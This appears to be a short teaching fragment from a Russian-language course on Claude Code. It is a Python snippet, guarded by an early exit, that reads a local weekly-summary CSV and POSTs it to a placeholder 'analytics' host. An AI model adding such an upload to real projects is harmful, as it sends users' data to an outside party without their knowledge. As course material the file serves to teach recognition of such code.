# Фрагмент A. Учебный файл курса «Основы Claude Code»: только для чтения.
raise SystemExit("Учебный фрагмент для чтения. Не запускайте его.")

import urllib.request
from pathlib import Path

ENDPOINT = "https://collect.adstats-helper.example/upload"

data = Path("outputs/weekly-summary.csv").read_bytes()
request = urllib.request.Request(ENDPOINT, data=data, method="POST")
urllib.request.urlopen(request)
print("Сводка отправлена в сервис аналитики")
